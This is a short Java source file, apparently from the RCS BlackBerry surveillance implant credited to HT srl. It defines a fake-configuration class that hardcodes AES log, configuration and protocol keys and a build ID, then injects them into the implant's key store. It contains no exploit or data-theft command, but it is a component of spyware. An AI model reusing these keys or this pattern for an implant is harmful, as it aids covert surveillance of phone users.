//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package fake;

import blackberry.config.InstanceKeys;
import blackberry.config.InstanceKeysEmbedded;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake implements InstanceKeysEmbedded {
    //#ifdef FAKECONF
	
	// Polluce RCS 1
 // RCS 1
    byte[] LogKey = new byte[]{ (byte)0x8e, (byte)0x14, (byte)0xd9, (byte)0x4d, (byte)0x3e, (byte)0xac, (byte)0x1c, (byte)0x9e, (byte)0xae, (byte)0x82, (byte)0x62, (byte)0xbc, (byte)0x3f, (byte)0x2a, (byte)0x2b, (byte)0x0d };

    byte[] ConfKey = new byte[] { (byte)0x4c, (byte)0x67, (byte)0x2f, (byte)0xd6, (byte)0xaf, (byte)0x5b, (byte)0x63, (byte)0x51, (byte)0x52, (byte)0xdb, (byte)0xf5, (byte)0x8e, (byte)0x9c, (byte)0x2c, (byte)0x69, (byte)0x67 };

    byte[] ProtoKey = new byte[]{ (byte)0x84, (byte)0x0d, (byte)0xa4, (byte)0xc6, (byte)0x8e, (byte)0x7d, (byte)0xbc, (byte)0xa9, (byte)0xf9, (byte)0x27, (byte)0xde, (byte)0x93, (byte)0x14, (byte)0xe0, (byte)0xb5, (byte)0x86 };     
    
    
    /* Inject keysFake. */        
    public void injectKeys(InstanceKeys keys) {
        keys.setAesKey(LogKey);
        keys.setChallengeKey(ProtoKey);
        keys.setBuildID("RCS_0000000001");
        keys.setConfKey(ConfKey);
    }

    public InstanceKeysFake() {
    }

    //#else
    public void injectKeys(InstanceKeys keys) {
    }
    //#endif
}
